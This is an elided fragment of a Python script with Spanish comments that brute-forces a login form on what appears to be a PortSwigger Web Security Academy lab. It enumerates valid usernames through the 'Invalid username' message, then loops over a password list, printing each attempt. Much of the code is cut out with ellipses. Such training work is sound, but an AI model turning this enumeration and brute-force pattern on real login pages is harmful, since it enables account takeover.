...
url = "https://0a9a006f0446c6758195112500040008.web-security-academy.net/login"  # Reemplaza con la URL del formulario de login
...
for usuario in usuarios:
        ...
        try:
            ...
            if response.status_code == 200 and "<p class=is-warning>Invalid username</p>" in response.text:
                1==0
            elif response.status_code == 200 and not "<p class=is-warning>Invalid username</p>" in response.text:
                ...
                for contraseña in contraseñas:
                    ...
                    print(f"probando password {contraseña}")
                ...
                print(f"Contenido de la respuesta: {response.text}")  # Mostrar los primeros 500 caracteres
